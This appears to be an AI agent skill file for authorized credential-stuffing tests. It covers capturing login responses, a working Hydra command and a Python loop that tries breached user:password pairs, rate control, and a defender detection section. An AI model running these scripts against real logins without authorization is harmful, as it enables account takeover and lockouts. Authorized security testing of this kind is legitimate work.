---
name: credential-stuffing
description: Use when testing whether breached username and password pairs
  grant access to an application on an authorized engagement. Covers safe
  credential sourcing, request building for login forms and APIs, rate
  control to avoid lockouts, and distinguishing valid logins from errors.
  Use when assessing password reuse risk, when the scope allows login
  testing with provided breach data, or when measuring the effectiveness of
  lockout and alerting controls.
version: 1.0.0
domain: auth
lifecycle: stable
last_verified: 2026-10-23
parent: auth-attacks
requires: [auth-attacks]
extends: []
relates: [password-attacks, osint-methodology]
tools:
  - name: Hydra
    version: 9.5
  - name: Burp Suite
    version: 2026.2
  - name: Python
    version: 3.12
---

Credential stuffing tests breached credential pairs against a login: the
attack that makes every public breach dangerous for password reusers. On
authorized tests, this sub-skill covers running controlled stuffing with
credentials the engagement explicitly provides or approves: building the
login request, controlling rate to respect lockout policies, and reading
results accurately. Never use real breach data against accounts without
written permission, and never test production logins at aggressive rates.

## Quick Workflow

1. Get written approval for the credential set and the target logins.
2. Confirm the lockout and rate-limit policy so the test does not lock
   real users out.
3. Capture the exact login request, including CSRF tokens and headers.
4. Build the user and password lists from the approved source only.
5. Run at a controlled rate with one thread, watching for lockout signs.
6. Verify each hit by hand before reporting it.
7. Report hits, lockout behavior, and detection observations.

## 1. Building the login request

```bash
# Capture the baseline: failed login response signature
curl -s -X POST 'https://target.example/login' \
  -d 'username=testuser&password=wrongpass' -o /tmp/fail.html -w '%{http_code}\n'
grep -i -o '.\{0,40\}invalid.\{0,40\}' /tmp/fail.html | head -2

# Successful login signature (use the provided test account)
curl -s -X POST 'https://target.example/login' \
  -d 'username=testuser&password=TestPass123!' -o /tmp/ok.html -w '%{http_code}\n'
diff /tmp/fail.html /tmp/ok.html | head -10

# Hydra against the form, one thread, failure string from the baseline
hydra -L /tmp/users.txt -P /tmp/breach_passwords.txt -t 1 -w 5 \
  -f https-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials" \
  -o /tmp/hydra_out.txt target.example
```

The failure string is the whole test: Hydra decides hit versus miss on it.
Verify the string against real fail and success responses before the run,
or every result is suspect.

## 2. Rate control and lockout safety

```bash
# Python loop with explicit delays and lockout detection
python3 - <<'EOF'
import time, urllib.request, urllib.parse

URL = "https://target.example/login"
FAIL_MARKER = b"Invalid credentials"
LOCKOUT_MARKER = b"too many attempts"

def attempt(user, pwd):
    data = urllib.parse.urlencode({"username": user, "password": pwd}).encode()
    req = urllib.request.Request(URL, data=data)
    with urllib.request.urlopen(req, timeout=15) as r:
        body = r.read()
    if LOCKOUT_MARKER in body:
        print("[!] LOCKOUT detected, stopping")
        raise SystemExit(1)
    return FAIL_MARKER not in body

pairs = [l.strip().split(":", 1) for l in open("/tmp/pairs.txt")]
for user, pwd in pairs:
    if attempt(user, pwd):
        print(f"[+] HIT: {user}")
    time.sleep(3)  # stay well under rate limits
EOF
```

Start with the test accounts to learn the lockout threshold, then stay far
below it. If the policy is unknown, assume five failures per account per
hour and design the run around that.

## Edge cases

- The login uses multi-step flows or captchas. Automate only what the
  scope allows; captchas usually mean manual testing or an agreed bypass
  for the test accounts.
- Every attempt returns the same page. The failure signal may be a
  redirect target, a response time, or a JSON field; find the real signal
  before trusting any tool's verdict.
- The account list includes real users. Stuffing real users risks
  lockouts and alert fatigue; prefer test accounts unless the scope
  explicitly names real ones.
- MFA blocks the password-only hit. A valid password with MFA enforced is
  a partial finding: note the password reuse risk and the MFA mitigation
  together.

## Escalation

- Lockouts trigger despite care: stop immediately, inform the test lead,
  and document the threshold you discovered; the lockout working is
  itself a defensive finding.
- You need to test at higher volume: get written approval for the rate
  and the window, and coordinate with the SOC so alerts are expected.
- Hits need impact proof: log in by hand with the hit credential, take a
  screenshot of the authenticated session, then log out; never change the
  account.

## Detection and defender view

Defenders see stuffing as many failed logins for many accounts from few
IPs, often with breached-password patterns and tool User-Agents. Good
detection is failed-login analytics per IP and per account, alerting on
distributed patterns, and checking passwords against breach corpora at
registration and login. Defenses are MFA everywhere, strict lockouts with
careful denial-of-service tradeoffs, breached-password blocking, and
bot mitigation on login endpoints.

## Key references

- MITRE ATT&CK T1110.004 (Brute Force: Credential Stuffing).
- CWE-307 (Improper Restriction of Excessive Authentication Attempts).
- CWE-521 (Weak Password Requirements).
- OWASP Testing Guide: Testing for Weak Lock Out Mechanism.
- OWASP Credential Stuffing Prevention Cheat Sheet.
